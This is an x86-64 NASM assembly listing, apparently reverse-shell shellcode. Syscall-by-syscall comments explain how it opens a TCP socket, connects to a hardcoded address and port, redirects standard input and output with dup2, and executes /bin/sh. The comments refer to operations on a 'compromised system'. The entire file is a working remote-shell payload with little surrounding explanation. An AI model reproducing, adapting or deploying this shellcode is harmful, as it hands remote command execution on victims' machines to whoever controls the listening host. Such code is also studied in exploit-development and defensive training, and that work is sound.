global _start
section .text
 
_start:
    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx
    xor r8,r8
     
    ; Socket
    ; Function prototype:
    ;   int socket(int domain, int type, int protocol)
    ; Purpose:
    ;   creates an endpoint for communications, returns a
    ;   descriptor that will be used throughout the code to
    ;   bind/listen/accept communications
    push 0x2
    pop rdi
    push 0x1
    pop rsi
    push 0x6
    pop rdx
    push 0x29
    pop rax
    syscall 
    mov r8,rax
     
    ; Connect
    ; Function protoype:
    ;   int connect(int sockfd, const struct sockaddr *addr,
    ;       socklen_t addrlen)
    ; Purpose:
    ;   initiate a connection on socket referred by the file
    ;   descriptor to the address specified in addr.
    xor rsi,rsi
    xor r10,r10
    push r10
    mov byte [rsp],0x2
    mov word [rsp+0x2],0x697a
    mov dword [rsp+0x4],0xa1080c0
    mov rsi, rsp
    push byte 0x10
    pop rdx
    push r8
    pop rdi
    push 0x2a
    pop rax
    syscall
     
    ; Dup2
    ; Function prototype:
    ;   int dup2(int oldfd, int newfd)
    ; Purpose:
    ;   duplicate a file descriptor, copies the old file
    ;   descriptor to a new one allowing them to be used
    ;   interchangably, this allows all shell ops to/from the
    ;   compromised system
    xor rsi,rsi
    push 0x3
    pop rsi
doop:
    dec rsi
    push 0x21
    pop rax
    syscall 
    jne doop
     
    ; Execve
    ; Function descriptor:
    ;   int execve(const char *fn, char *const argv[],
    ;       char *const envp[])
    ; Purpose:
    ;   to execute a program on a remote and/or compromised
    ;   system. There is no return from using execve therefore
    ;   an exit syscall is not required
    xor rdi,rdi
    push rdi
    push rdi
    pop rsi
    pop rdx
    mov rdi,0x68732f6e69622f2f
    shr rdi,0x8
    push rdi
    push rsp
    pop rdi
    push 0x3b
    pop rax
    syscall
